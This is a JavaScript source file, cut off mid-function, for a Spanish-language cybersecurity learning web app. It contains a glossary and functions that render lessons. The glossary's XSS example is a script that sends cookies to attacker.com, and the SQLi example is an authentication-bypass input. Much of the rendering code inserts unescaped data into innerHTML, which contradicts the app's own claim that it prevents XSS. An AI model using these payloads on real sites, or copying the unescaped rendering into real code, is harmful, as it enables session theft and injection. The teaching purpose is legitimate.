window.CyberData = window.CyberData || {};
window.CyberData.glossary = window.CyberData.glossary || [
  { term: "TCP (Transmission Control Protocol)", simpleDef: "Protocolo de red que garantiza que los mensajes lleguen completos y en orden correcto a su destino.", techDef: "Protocolo de capa de transporte orientado a conexión que utiliza números de secuencia, reconocimientos (ACK) y control de flujo para asegurar entregas confiables.", example: "El tráfico web HTTPS o la transferencia de archivos por SSH utilizan TCP.", related: ["UDP", "IP", "Handshake"] },
  { term: "UDP (User Datagram Protocol)", simpleDef: "Protocolo de red súper rápido que envía datos sin verificar si llegaron todos o en orden.", techDef: "Protocolo de capa de transporte no orientado a conexión y sin estado. Reduce la latencia al omitir handshakes o confirmaciones.", example: "Transmisión de video en vivo, llamadas VoIP y consultas DNS usan UDP.", related: ["TCP", "DNS", "Sockets"] },
  { term: "DNS (Domain Name System)", simpleDef: "La libreta de direcciones de Internet que traduce nombres legibles (google.com) a direcciones IP numéricas.", techDef: "Sistema jerárquico y distribuido de bases de datos que resuelve nombres de dominio a direcciones IPv4/IPv6 mediante servidores raíz, TLD y autoritativos.", example: "Escribir 'cyberlab.edu' activa una consulta al puerto 53 para obtener la IP 192.168.1.50.", related: ["IP", "HTTP", "Envenenamiento DNS"] },
  { term: "SIEM (Security Information and Event Management)", simpleDef: "Un centro de control centralizado que recolecta alertas de todos los equipos de la empresa para detectar ataques.", techDef: "Plataforma que centraliza, agrega y correlaciona logs de seguridad en tiempo real para generar alertas y permitir investigaciones forenses.", example: "Splunk, Microsoft Sentinel y Elastic SIEM son soluciones populares de SIEM.", related: ["SOC", "Logs", "MITRE ATT&CK"] },
  { term: "EDR (Endpoint Detection and Response)", simpleDef: "Un antivirus avanzado instalado en las computadoras que monitorea constantemente comportamientos sospechosos.", techDef: "Agente de seguridad en host que combina monitoreo continuo de procesos, análisis de comportamiento y aislamiento remoto de endpoints comprometidos.", example: "CrowdStrike Falcon o Defender for Endpoint detectando la inyección de código en un proceso legítimo.", related: ["SIEM", "SOC", "Malware"] },
  { term: "IOC (Indicator of Compromise)", simpleDef: "Una huella o pista digital que confirma que una computadora o red fue infectada.", techDef: "Artefacto forense (dirección IP maliciosa, hash de archivo, clave de registro) que demuestra la presencia de una intrusión con alto grado de certidumbre.", example: "El hash SHA-256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 pertenece a un ejecutable malicioso.", related: ["IOA", "Threat Intelligence", "Forense"] },
  { term: "IOA (Indicator of Attack)", simpleDef: "Una señal en tiempo real que indica que un ataque está ocurriendo en este preciso instante.", techDef: "Indicador enfocado en la intención y comportamiento del adversario en tiempo real, independientemente de las herramientas o hashes utilizados.", example: "Intentos consecutivos de ejecución de comandos PowerShell codificados en Base64.", related: ["IOC", "TTP", "Detección"] },
  { term: "TTP (Tactics, Techniques, and Procedures)", simpleDef: "El estilo de juego y metodología típica que utiliza un grupo de hackers para atacar.", techDef: "Descripción conceptual del comportamiento de las amenazas avanzadas (APTs), categorizadas en el marco de trabajo MITRE ATT&CK.", example: "El grupo APT29 utiliza Phishing (Táctica: Acceso Inicial) y PowerShell (Técnica: Ejecución).", related: ["MITRE ATT&CK", "Threat Intelligence"] },
  { term: "XSS (Cross-Site Scripting)", simpleDef: "Vulnerabilidad web donde un atacante logra inyectar código JavaScript malicioso en una página para robar cookies de otros usuarios.", techDef: "Vulnerabilidad de aplicaciones web donde entradas no sanitizadas son renderizadas en el navegador de la víctima, ejecutando scripts arbitrarios.", example: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>", related: ["Seguridad Web", "CSRF", "OWASP"] },
  { term: "CSRF (Cross-Site Request Forgery)", simpleDef: "Engañar al navegador de un usuario autenticado para que realice acciones involuntarias en un sitio de confianza.", techDef: "Ataque que fuerza a un cliente autenticado a enviar peticiones HTTP no deseadas hacia una aplicación web vulnerable aprovechando las cookies de sesión automáticas.", example: "Hacer clic en un enlace falso que envía una transferencia de dinero sin el consentimiento del usuario.", related: ["XSS", "Cookies", "Tokens"] },
  { term: "SQLi (SQL Injection)", simpleDef: "Inyectar comandos de base de datos en un formulario para leer o alterar información confidencial.", techDef: "Inserción de fragmentos de código SQL en parámetros de entrada no validados que alteran la lógica de la consulta enviada a la base de datos.", example: "Ingresar ' OR '1'='1 en el campo de usuario para saltarse la autenticación.", related: ["Base de datos", "Prepared Statements", "OWASP"] },
  { term: "CVE (Common Vulnerabilities and Exposures)", simpleDef: "Un identificador único internacional asignado a cada fallo de ciberseguridad conocido públicamente.", techDef: "Diccionario estandarizado de identificadores públicos asignados a vulnerabilidades de seguridad informáticas de software y hardware.", example: "CVE-2021-44228 es el identificador oficial de la vulnerabilidad crítica Log4Shell.", related: ["CVSS", "NVD", "Vulnerabilidad"] },
  { term: "CVSS (Common Vulnerability Scoring System)", simpleDef: "El puntaje numérico del 0 al 10 que indica qué tan severa y peligrosa es una vulnerabilidad.", techDef: "Estándar abierto para evaluar la gravedad de las vulnerabilidades de seguridad informática según métricas base, temporales y ambientales.", example: "Log4Shell tiene una puntuación CVSSv3 de 10.0 (Crítica).", related: ["CVE", "Riesgo"] },
  { term: "MITRE ATT&CK", simpleDef: "La enciclopedia global más famosa que organiza todas las formas conocidas en que los hackers atacan a las empresas.", techDef: "Matriz estructurada de conocimiento accesible globalmente sobre las tácticas y técnicas de los adversarios basadas en observaciones del mundo real.", example: "Revisar la matriz para entender cómo los atacantes realizan movimiento lateral dentro de un entorno Windows.", related: ["TTP", "SOC", "Blue Team"] },
  { term: "SOC (Security Operations Center)", simpleDef: "El equipo y centro de operaciones encargado de vigilar las 24 horas del día las alertas de seguridad de una empresa.", techDef: "Unidad centralizada dentro de una organización encargada de monitorear, detectar, analizar y responder a incidentes de ciberseguridad continuamente.", example: "Los analistas Nivel 1 del SOC filtran alertas del SIEM y escalan incidentes a Nivel 2.", related: ["SIEM", "Incident Response", "EDR"] },
  { term: "DFIR (Digital Forensics and Incident Response)", simpleDef: "Los detectives de la ciberseguridad que investigan qué ocurrió exactamente tras un ciberataque.", techDef: "Disciplina especializada que combina la recolección estricta de evidencia digital (Forense) con la contención y remediación de brechas (Respuesta a Incidentes).", example: "Extraer la memoria RAM de un servidor infectado para recuperar la clave de cifrado del ransomware.", related: ["Forense", "IOC", "Memoria"] },
  { term: "OSINT (Open Source Intelligence)", simpleDef: "La recolección legal y ética de información pública disponible en Internet para investigar objetivos.", techDef: "Metodología de inteligencia que recopila, procesa y analiza datos accesibles públicamente en fuentes abiertas (redes sociales, registros DNS, motores de búsqueda).", example: "Utilizar Shodan o Google Dorking para descubrir servidores expuestos por error.", related: ["Reconocimiento", "Pentesting"] },
  { term: "IAM (Identity and Access Management)", simpleDef: "El sistema que administra las identidades de los usuarios y asegura que solo accedan a lo que necesitan.", techDef: "Marco de políticas y tecnologías que garantiza que las personas adecuadas tengan el acceso apropiado a los recursos tecnológicos requeridos.", example: "AWS IAM gestionando roles, políticas y claves de acceso para recursos en la nube.", related: ["MFA", "Autenticación", "Principio de Mínimo Privilegio"] },
  { term: "MFA (Multi-Factor Authentication)", simpleDef: "Requerir dos o más pruebas de identidad antes de permitir iniciar sesión (ej: contraseña + código al celular).", techDef: "Sistema de seguridad que requiere dos o más factores independientes de verificación: algo que sabes (contraseña), algo que tienes (token TOTP) o algo que eres (huella).", example: "Ingresar tu clave de usuario y validar la notificación en Google Authenticator.", related: ["IAM", "Autenticación"] },
  { term: "Zero Trust (Confianza Cero)", simpleDef: "Filosofía de seguridad que asume que la red interna ya está infectada y verifica estrictamente cada petición.", techDef: "Modelo de seguridad basado en el principio 'Nunca confíes, siempre verifica'. Requiere autenticación y autorización continua de cada solicitud sin importar el origen de red.", example: "Exigir MFA y verificación del estado del dispositivo incluso si la computadora está conectada a la oficina física.", related: ["IAM", "Hardening", "Defensa en Profundidad"] }
];

class CyberLabApp {
  constructor() {
    this.init();
  }

  async init() {
    console.log('⚡ Inicializando CyberLab Platform...');

    // Load JSON Datasets (Synchronous Bundle or Async Fetch)
    await this.loadAllDatasets();

    // Pre-render ALL views on startup so content exists immediately in DOM
    this.renderAllViews();

    // Register Service Worker for PWA Offline Functionality
    this.registerServiceWorker();

    // Initial View Render
    const initialView = (window.location.hash || '#dashboard').replace('#', '');
    this.onViewChange(initialView);

    // Subscribe to state changes to update header stats
    window.addEventListener('cyberlab_state_updated', () => {
      this.updateHeaderStats();
    });
    this.updateHeaderStats();
  }

  async loadAllDatasets() {
    const files = [
      'modules', 'quizzes', 'challenges', 'labs',
      'resources', 'glossary', 'tools', 'achievements',
      'projects', 'roadmaps', 'cases', 'mitre'
    ];

    try {
      const responses = await Promise.all(files.map(f => fetch(`./data/${f}.json`)));
      const jsons = await Promise.all(responses.map(r => r.ok ? r.json() : null));
      
      window.CyberData = window.CyberData || {};
      files.forEach((f, index) => {
        if (jsons[index] && Array.isArray(jsons[index]) && jsons[index].length > 0) {
          window.CyberData[f] = jsons[index];
        }
      });
      console.log('✅ Datasets cargados en paralelo:', Object.keys(window.CyberData));
    } catch (e) {
      console.error('Error al cargar datasets:', e);
    }
  }

  renderAllViews() {
    if (window.CyberDashboard) window.CyberDashboard.render();
    if (window.CyberRecorrido) window.CyberRecorrido.renderPath();
    if (window.CyberKnowledgeMap) window.CyberKnowledgeMap.render();
    if (window.CyberLearningTree) window.CyberLearningTree.render();
    if (window.CyberLabs) window.CyberLabs.render();
    if (window.CyberQuizzes) window.CyberQuizzes.render();
    if (window.CyberSpaced) window.CyberSpaced.render();
    if (window.CyberNotes) window.CyberNotes.render();
    if (window.CyberResources) window.CyberResources.render();
    if (window.CyberTutor) window.CyberTutor.render();
    this.renderGlossary();
    this.renderTools();
    this.renderProjects();
    this.renderRoadmaps();
    this.renderCases();
    this.renderMitre();
    this.renderChallenges();
    this.renderPlatformSecurity();
    this.renderProfile();
  }

  updateHeaderStats() {
    const data = window.CyberStorage?.data || { xp: 0, level: 1, streak: 1 };
    document.querySelectorAll('.stat-xp-val').forEach(el => el.textContent = (data.xp || 0).toLocaleString());
    document.querySelectorAll('.stat-level-val').forEach(el => el.textContent = data.level || 1);
    document.querySelectorAll('.stat-streak-val').forEach(el => el.textContent = `${data.streak || 1} d`);

    const account = window.CyberAccounts?.getActive();
    const userBox = document.getElementById('header-user-profile-badge');
    if (userBox) {
      if (account) {
        const avatarSrc = (account.avatar && (account.avatar.startsWith('data:') || account.avatar.startsWith('http')))
          ? `<img src="${account.avatar}" style="width:24px;height:24px;border-radius:50%;object-fit:cover;border:1px solid var(--accent-cyan)">`
          : `<span style="font-size:1.1rem">${account.avatar || '🛡️'}</span>`;
        userBox.innerHTML = `${avatarSrc} <span style="font-weight:700;font-size:0.85rem;color:#ffffff">${account.username}</span> <span style="font-size:0.78rem;color:#ffc700;margin-left:4px;font-weight:700">🏆 ${(data.xp || 0).toLocaleString()}</span>`;
      } else {
        userBox.innerHTML = `<span style="font-size:1.1rem">👤</span> <span style="font-weight:700;font-size:0.85rem;color:var(--accent-cyan)">Ingresar</span>`;
      }
    }
  }

  onViewChange(viewName) {
    switch (viewName) {
      case 'dashboard':
        if (window.CyberDashboard) window.CyberDashboard.render();
        break;
      case 'recorrido':
        if (window.CyberRecorrido) window.CyberRecorrido.renderPath();
        break;
      case 'map':
        if (window.CyberKnowledgeMap) window.CyberKnowledgeMap.render();
        break;
      case 'tree':
        if (window.CyberLearningTree) window.CyberLearningTree.render();
        break;
      case 'labs':
        if (window.CyberLabs) window.CyberLabs.render();
        break;
      case 'quizzes':
        if (window.CyberQuizzes) window.CyberQuizzes.render();
        break;
      case 'spaced-repetition':
        if (window.CyberSpaced) window.CyberSpaced.render();
        break;
      case 'notes':
        if (window.CyberNotes) window.CyberNotes.render();
        break;
      case 'resources':
        if (window.CyberResources) window.CyberResources.render();
        break;
      case 'cybertutor':
        if (window.CyberTutor) window.CyberTutor.render();
        break;
      case 'glossary':
        this.renderGlossary();
        break;
      case 'tools':
        this.renderTools();
        break;
      case 'projects':
        this.renderProjects();
        break;
      case 'careers':
        this.renderRoadmaps();
        break;
      case 'cases':
        this.renderCases();
        break;
      case 'mitre':
        this.renderMitre();
        break;
      case 'challenges':
        this.renderChallenges();
        break;
      case 'security':
        this.renderPlatformSecurity();
        break;
      case 'profile':
        this.renderProfile();
        break;
      default:
        if (window.CyberDashboard) window.CyberDashboard.render();
        break;
    }
  }

  renderGlossary(filterMode = 'all', searchQuery = '') {
    const container = document.getElementById('glossary-root');
    if (!container) return;
    const account = window.CyberAccounts?.getActive();
    const aiGlossary = window.CyberStorage?.data?.aiGlossary || [];
    const officialGlossary = (window.CyberData && Array.isArray(window.CyberData.glossary) && window.CyberData.glossary.length > 0) 
      ? window.CyberData.glossary 
      : [];
    
    let combinedGlossary = [...aiGlossary, ...officialGlossary];

    if (filterMode === 'ai') {
      combinedGlossary = combinedGlossary.filter(g => g.isAi || g.category === '🤖 IA CyberTutor');
    } else if (filterMode === 'official') {
      combinedGlossary = combinedGlossary.filter(g => !g.isAi && g.category !== '🤖 IA CyberTutor');
    }

    if (searchQuery) {
      const q = searchQuery.toLowerCase();
      combinedGlossary = combinedGlossary.filter(g => 
        (g.term && g.term.toLowerCase().includes(q)) || 
        (g.simpleDef && g.simpleDef.toLowerCase().includes(q)) ||
        (g.techDef && g.techDef.toLowerCase().includes(q))
      );
    }

    let html = `
      <div class="card" style="margin-bottom: 12px; padding: 14px;">
        <div style="display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;margin-bottom:10px;">
          <div>
            <h2 style="font-size: 1.15rem; font-weight:800; margin:0 0 4px; color:#fff;">📖 Glosario & Diccionario Técnico</h2>
            <div style="font-size:.78rem; color: var(--text-muted);">
              ${account ? `🔒 Persistido en tu cuenta <strong style="color:var(--accent-cyan)">@${account.username}</strong>` : '⚠️ Inicia sesión para sincronizar términos en la nube.'}
            </div>
          </div>
          <div style="display:flex;gap:6px;">
            <span class="tag cyan" style="font-size:.7rem;">📚 ${officialGlossary.length} Oficiales</span>
            <span class="tag purple" style="font-size:.7rem;background:rgba(163,113,247,.18);color:#d0b5ff;border:1px solid rgba(163,113,247,.3);">🤖 ${aiGlossary.length} Por IA</span>
          </div>
        </div>

        <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
          <input type="text" id="glossary-search-input" class="chat-input" placeholder="🔍 Buscar término..." value="${this.esc(searchQuery)}" style="flex:1;min-width:180px;height:38px;font-size:0.82rem;">
          <div style="display:flex;gap:4px;">
            <button class="btn btn-sm ${filterMode === 'all' ? 'btn-primary' : 'btn-secondary'}" onclick="window.CyberApp.renderGlossary('all', document.getElementById('glossary-search-input').value)">Todos</button>
            <button class="btn btn-sm ${filterMode === 'ai' ? 'btn-primary' : 'btn-secondary'}" onclick="window.CyberApp.renderGlossary('ai', document.getElementById('glossary-search-input').value)">🤖 IA</button>
            <button class="btn btn-sm ${filterMode === 'official' ? 'btn-primary' : 'btn-secondary'}" onclick="window.CyberApp.renderGlossary('official', document.getElementById('glossary-search-input').value)">📚 Oficial</button>
          </div>
        </div>
      </div>

      <div class="grid-cards">
    `;

    if (combinedGlossary.length === 0) {
      html += `
        <div class="card" style="text-align:center;padding:24px;color:var(--text-muted);grid-column:1/-1;">
          ${searchQuery ? 'No se encontraron términos que coincidan con la búsqueda.' : 'No hay términos guardados por IA aún. Pídele a CyberTutor IA que guarde cualquier concepto en tu glosario.'}
        </div>`;
    } else {
      combinedGlossary.forEach(g => {
        const isAi = g.isAi || g.category === '🤖 IA CyberTutor';
        const tagClass = isAi ? 'purple' : 'cyan';
        const tagLabel = isAi ? '🤖 IA CyberTutor' : (g.term.split(' ')[0] || 'Oficial');
        const escapedTerm = this.esc(g.term);

        html += `
          <div class="card" style="${isAi ? 'border-color: rgba(163,113,247,.35); background: rgba(18,14,30,.85);' : ''} padding: 12px 14px; border-radius: 14px;">
            <div class="card-header" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;">
              <span class="tag ${tagClass}">${tagLabel}</span>
              ${isAi ? `
              <button class="btn-icon" style="font-size:0.75rem;padding:2px 6px;color:#ff6b6b;background:rgba(255,107,107,0.1);border:1px solid rgba(255,107,107,0.2);border-radius:6px;" title="Eliminar de mi glosario" onclick="window.CyberApp.deleteGlossaryTerm('${escapedTerm}')">🗑️</button>
              ` : ''}
            </div>
            <h3 style="font-size: 0.98rem; font-weight: 700; margin-bottom: 6px; color:#fff;">${g.term}</h3>
            <p style="font-size: 0.83rem; color: var(--text-main); margin-bottom: 6px; line-height:1.4;"><strong>Explicación:</strong> ${g.simpleDef}</p>
            ${g.techDef && g.techDef !== g.simpleDef ? `<p style="font-size: 0.78rem; color: var(--text-muted); margin-bottom: 8px; line-height:1.35;"><strong>Técnica:</strong> ${g.techDef}</p>` : ''}
            ${g.example ? `
            <div style="background: rgba(0,240,255,.06); padding: 6px 10px; border-radius: 10px; font-size: 0.76rem; color: var(--accent-yellow); border:1px solid rgba(0,240,255,.12);">
              💡 <strong>Ejemplo:</strong> ${g.example}
            </div>` : ''}
          </div>
        `;
      });
    }

    html += `</div>`;
    container.innerHTML = html;

    const input = container.querySelector('#glossary-search-input');
    if (input) {
      input.oninput = () => {
        this.renderGlossary(filterMode, input.value);
      };
    }
  }

  deleteGlossaryTerm(term) {
    if (confirm(`¿Eliminar '${term}' de tu glosario personal?`)) {
      if (window.CyberStorage?.deleteAiGlossaryTerm) {
        window.CyberStorage.deleteAiGlossaryTerm(term);
        this.renderGlossary();
      }
    }
  }

  renderTools() {
    const container = document.getElementById('tools-root');
    if (!container) return;
    const tools = window.CyberData.tools || [];

    let html = `
      <div class="card" style="margin-bottom: 20px;">
        <h2 style="font-size: 1.4rem;">🛠️ Biblioteca de Herramientas de Ciberseguridad</h2>
        <p style="color: var(--text-muted);">Software esencial, su propósito operativo y laboratorios donde practicar.</p>
      </div>
      <div class="grid-cards">
    `;

    tools.forEach(t => {
      html += `
        <div class="card">
          <div class="card-header">
            <span class="tag purple">${t.category}</span>
            <span class="tag green">${t.level}</span>
          </div>
          <h3 style="font-size: 1.15rem; font-weight: 700; margin-bottom: 6px;">${t.name}</h3>
          <p style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 12px;">${t.description}</p>
          <div style="font-size: 0.8rem; color: var(--text-main); margin-bottom: 10px;">
            <strong>Sistemas Operativos:</strong> ${t.os}
          </div>
          <div style="background: var(--bg-surface); padding: 8px; border-radius: var(--radius-sm); font-size: 0.8rem; margin-bottom: 12px;">
            <strong>¿Cuándo usarla?:</strong> ${t.usageContext}
          </div>
          <a href="${t.officialUrl}" target="_blank" class="btn btn-secondary" style="font-size: 0.85rem; text-decoration: none; width: 100%; justify-content: center;">
            🌐 Sitio Oficial / Docs
          </a>
        </div>
      `;
    });

    html += `</div>`;
    container.innerHTML = html;
  }

  renderProjects() {
    const container = document.getElementById('projects-root');
    if (!container) return;
    const projects = window.CyberData.projects || [];

    let html = `
      <div class="card" style="margin-bottom: 20px;">
        <h2 style="font-size: 1.4rem;">🚀 Proyectos Prácticos de Seguridad</h2>
        <p style="color: var(--text-muted);">Construye herramientas y laboratorios reales para consolidar tu conocimiento.</p>
      </div>
      <div class="grid-cards">
    `;

    projects.forEach(p => {
      html += `
        <div class="card">
          <div class="card-header">
            <span class="tag cyan">${p.level}</span>
            <span class="tag purple">${p.category}</span>
          </div>
          <h3 style="font-size: 1.15rem; font-weight: 700; margin-bottom: 8px;">${p.title}</h3>
          <p style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 14px;">${p.description}</p>
          <div style="font-size: 0.85rem; margin-bottom: 12px;">
            <strong>Habilidades:</strong> ${(p.skills || []).join(', ')}
          </div>
          <div style="background: var(--bg-surface); padding: 10px; border-radius: var(--radius-sm); font-size: 0.85rem; color: var(--accent-green);">
            📦 <strong>Entregable Esperado:</strong> ${p.deliverable}
          </div>
        </div>
      `;
    });

    html += `</div>`;
    container.innerHTML = html;
  }

  renderRoadmaps() {
    const container = document.getElementById('roadmaps-root');
    if (!container) return;
    const roadmaps = window.CyberData.roadmaps || [];

    let html = `
      <div class="card" style="margin-bottom: 20px;">
        <h2 style="font-size: 1.4rem;">🛣️ Rutas y Especializaciones Profesionales</h2>
        <p style="color: var(--text-muted);">Descubre qué habilidades y certificaciones requiere cada rol en la industria.</p>
      </div>
      <div class="grid-cards">
    `;

    roadmaps.forEach(r => {
      html += `
        <div class="card">
          <h3 style="font-size: 1.2rem; font-weight: 700; color: var(--accent-cyan); margin-bottom: 8px;">${r.role}</h3>
          <p style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 14px;">${r.description}</p>
          <div style="margin-bottom: 12px;">
            <strong>Habilidades Clave:</strong>
            <div style="display: flex; gap: 6px; flex-wrap: wrap; margin-top: 4px;">
              ${r.keySkills.map(s => `<span class="tag cyan">${s}</span>`).join('')}
            </div>
          </div>
          <div>
            <strong>Certificaciones Relacionadas:</strong>
            <div style="display: flex; gap: 6px; flex-wrap: wrap; margin-top: 4px;">
              ${r.certifications.map(c => `<span class="tag yellow">${c}</span>`).join('')}
            </div>
          </div>
        </div>
      `;
    });

    html += `</div>`;
    container.innerHTML = html;
  }

  renderCases() {
    const container = document.getElementById('cases-root');
    if (!container) return;
    const cases = window.CyberData.cases || [];

    let html = `
      <div class="card" style="margin-bottom: 20px;">
        <h2 style="font-size: 1.4rem;">🕵️ CyberCases — Investigación de Incidentes Ficticios</h2>
        <p style="color: var(--text-muted);">Analiza registros de eventos reales, encuentra indicadores y toma decisiones de contención.</p>
      </div>
    `;

    cases.forEach(c => {
      html += `
        <div class="card" style="margin-bottom: 20px;">
          <div class="card-header">
            <span class="tag red">Investigación Activa</span>
            <span class="tag purple">${c.company}</span>
          </div>
          <h3 style="font-size: 1.25rem; font-weight: 700; margin-bottom: 8px;">${c.title}</h3>
          <p style="color: var(--text-muted); margin-bottom: 16px;">${c.summary}</p>
          
          <div class="terminal-window">
            <div class="terminal-header">
              <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
              <span style="font-size: 0.75rem; color: var(--text-muted);">SIEM Event Logs</span>
            </div>
            <div class="terminal-body">
              ${c.logs.map(l => `<div class="terminal-line">${l}</div>`).join('')}
            </div>
          </div>

          <h4 style="font-size: 1.05rem; margin-top: 16px; margin-bottom: 12px;">Preguntas de Investigación:</h4>
          ${c.questions.map((q, qIdx) => `
            <div style="background: var(--bg-surface); padding: 12px; border-radius: var(--radius-sm); margin-bottom: 10px;">
              <div style="font-weight: 600; margin-bottom: 8px;">Pregunta ${qIdx + 1}: ${q.question}</div>
              <div style="display: flex; flex-direction: column; gap: 6px;">
                ${q.options.map((opt, oIdx) => `
                  <button class="quiz-option-btn" onclick="window.CyberApp.answerCaseQuestion('${c.id}', ${qIdx}, ${oIdx}, ${q.answer}, this)">
                    ${opt}
                  </button>
                `).join('')}
              </div>
            </div>
          `).join('')}
        </div>
      `;
    });

    container.innerHTML = html;
  }

  answerCaseQuestion(caseId, qIdx, selectedIdx, correctIdx, btnEl) {
    const parent = btnEl.parentElement;
    parent.querySelectorAll('.quiz-option-btn').forEach(b => {
      b.classList.remove('correct', 'incorrect');
      b.disabled = true;
    });

    if (selectedIdx === correctIdx) {
      btnEl.classList.add('correct');
      window.CyberGamification.addXP(50, 'Respuesta correcta en CyberCase');
    } else {
      btnEl.classList.add('incorrect');
      parent.children[correctIdx].classList.add('correct');
    }
  }

  renderMitre() {
    const container = document.getElementById('mitre-root');
    if (!container) return;
    const mitre = window.CyberData.mitre || [];

    let html = `
      <div class="card" style="margin-bottom: 20px;">
        <h2 style="font-size: 1.4rem;">🎯 Matriz MITRE ATT&CK Educativa</h2>
        <p style="color: var(--text-muted);">Tácticas, técnicas, detecciones y mitigaciones de adversarios reales.</p>
      </div>
      <div class="grid-cards">
    `;

    mitre.forEach(m => {
      html += `
        <div class="card">
          <h3 style="font-size: 1.15rem; font-weight: 700; color: var(--accent-cyan); margin-bottom: 6px;">${m.tactic}</h3>
          <p style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 14px;">${m.description}</p>
          ${m.techniques.map(t => `
            <div style="background: var(--bg-surface); padding: 10px; border-radius: var(--radius-sm); margin-bottom: 8px; border: 1px solid var(--border-color);">
              <div style="font-weight: 700; font-size: 0.9rem; color: var(--accent-yellow);">${t.id}: ${t.name}</div>
              <div style="font-size: 0.85rem; color: var(--text-main); margin-top: 4px;">${t.desc}</div>
              <div style="font-size: 0.8rem; color: var(--accent-green); margin-top: 4px;"><strong>Detección:</strong> ${t.detection}</div>
            </div>
          `).join('')}
        </div>
      `;
    });

    html += `</div>`;
    container.innerHTML = html;
  }

  renderChallenges() {
    const container = document.getElementById('challenges-root');
    if (!container) return;
    const challenges = window.CyberData.challenges || [];

    let html = `
      <div class="card" style="margin-bottom: 20px;">
        <h2 style="font-size: 1.4rem;">⚔️ Retos Prácticos & Razonamiento</h2>
        <p style="color: var(--text-muted);">Demuestra tu capacidad de análisis resolviendo problemas de ciberseguridad.</p>
      </div>
    `;

    challenges.forEach(ch => {
      const isDone = window.CyberStorage.data.completedChallenges.includes(ch.id);
      html += `
        <div class="card" style="margin-bottom: 20px;">
          <div class="card-header">
            <span class="tag yellow">${ch.category}</span>
            <span class="tag cyan">+${ch.xp} XP</span>
          </div>
          <h3 style="font-size: 1.2rem; font-weight: 700; margin-bottom: 8px;">${ch.title}</h3>
          <p style="color: var(--text-muted); margin-bottom: 12px;">${ch.description}</p>
          
          <div style="background: var(--bg-surface); padding: 12px; border-radius: var(--radius-sm); margin-bottom: 14px; border: 1px solid var(--border-color);">
            <strong>Escenario / Requerimiento:</strong>
            <p style="font-size: 0.9rem; margin-top: 4px;">${ch.prompt}</p>
          </div>

          <button class="btn btn-secondary" style="margin-bottom: 12px;" onclick="this.nextElementSibling.style.display='block'">
            💡 Ver Pistas y Solución Ideal
          </button>
          
          <div style="display: none; background: var(--bg-dark); padding: 14px; border-radius: var(--radius-sm); border: 1px solid var(--accent-cyan);">
            <strong style="color: var(--accent-cyan);">Solución Ideal Recomendada:</strong>
            <p style="font-size: 0.9rem; white-space: pre-line; margin-top: 6px;">${ch.idealSolution}</p>
          </div>

          <div style="margin-top: 14px; display: flex; justify-content: flex-end;">
            <button class="btn btn-primary" onclick="window.CyberApp.completeChallenge('${ch.id}', ${ch.xp})" ${isDone ? 'disabled' : ''}>
              ${isDone ? '✓ Reto Completado' : 'Comparé mi Respuesta y Marcar Completado'}
            </button>
          </div>
        </div>
      `;
    });

    container.innerHTML = html;
  }

  completeChallenge(chId, xp) {
    const data = window.CyberStorage.data;
    if (!data.completedChallenges.includes(chId)) {
      data.completedChallenges.push(chId);
      window.CyberStorage.saveData();
      window.CyberGamification.addXP(xp, 'Reto completado');
      this.renderChallenges();
    }
  }

  renderPlatformSecurity() {
    const container = document.getElementById('security-root');
    if (!container) return;

    container.innerHTML = `
      <div class="card" style="margin-bottom: 20px;">
        <h2 style="font-size: 1.4rem;">🔒 Auditoría de Seguridad de la Plataforma CyberLab</h2>
        <p style="color: var(--text-muted);">Como estudiante de ciberseguridad, aprende cómo está protegida la propia aplicación que estás usando.</p>
      </div>

      <div class="grid-cards">
        <div class="card">
          <h3 style="font-size: 1.1rem; color: var(--accent-green); margin-bottom: 8px;">✓ Prevención de XSS (Cross-Site Scripting)</h3>
          <p style="font-size: 0.9rem; color: var(--text-muted);">Todos los inputs de notas y texto de usuario utilizan métodos de inserción seguros (\`textContent\` y escapado de caracteres) evitando la ejecución de código JavaScript inyectado.</p>
        </div>

        <div class="card">
          <h3 style="font-size: 1.1rem; color: var(--accent-green); margin-bottom: 8px;">✓ 0% Exposición de Secretos en Frontend</h3>
          <p style="font-size: 0.9rem; color: var(--text-muted);">La aplicación no almacena API Keys, tokens de acceso ni credenciales en el código fuente cliente, garantizando la compatibilidad segura con GitHub Pages.</p>
        </div>

        <div class="card">
          <h3 style="font-size: 1.1rem; color: var(--accent-green); margin-bottom: 8px;">✓ Privacidad y Persistencia Local</h3>
          <p style="font-size: 0.9rem; color: var(--text-muted);">Todo tu progreso, notas y respuestas se almacenan exclusivamente en el \`localStorage\` de tu navegador sin transmitir datos a servidores externos no autorizados.</p>
        </div>

        <div class="card">
          <h3 style="font-size: 1.1rem; color: var(--accent-green); margin-bottom: 8px;">✓ Principio de Ética y Legalidad</h3>
          <p style="font-size: 0.9rem; color: var(--text-muted);">CyberLab enseña metodologías ofensivas exclusivamente orientadas hacia la defensa, bastionado de sistemas y entornos autorizados/locales.</p>
        </div>
      </div>
    `;
  }

  renderProfile() {
    if (window.CyberProfileAccounts && typeof window.CyberProfileAccounts.render === 'function') {
      window.CyberProfileAccounts.render();
      return;
    }
    const container = document.getElementById('profile-root');
    if (!container) return;
    const data = window.CyberStorage.data;
    const achievements = window.CyberData.achievements || [];

    let html = `
      <div class="card" style="margin-bottom: 20px;">
        <div style="display: flex; align-items: center; gap: 16px;">
          <div style="font-size: 3rem; background: var(--bg-surface); padding: 12px; border-radius: var(--radius-full);">👨‍💻</div>
          <div>
            <h2 style="font-size: 1.5rem;">Perfil del Estudiante</h2>
            <div style="display: flex; gap: 8px; margin-top: 4px;">
              <span class="tag cyan">Nivel ${data.level}</span>
              <span class="tag purple">${data.xp.toLocaleString()} XP Totales</span>
              <span class="tag yellow">🔥 Racha de ${data.streak} días</span>
            </div>
          </div>
        </div>
      </div>

      <div class="grid-cards">
        <div class="card">
          <h3 style="font-size: 1.1rem; margin-bottom: 12px;">Objetivos Personalizados</h3>
          <div style="margin-bottom: 10px;">
            <strong style="font-size: 0.85rem; color: var(--text-muted);">OBJETIVO PRINCIPAL:</strong>
            <div style="font-weight: 600; margin-top: 2px;">${data.primaryObjective}</div>
          </div>
          <div>
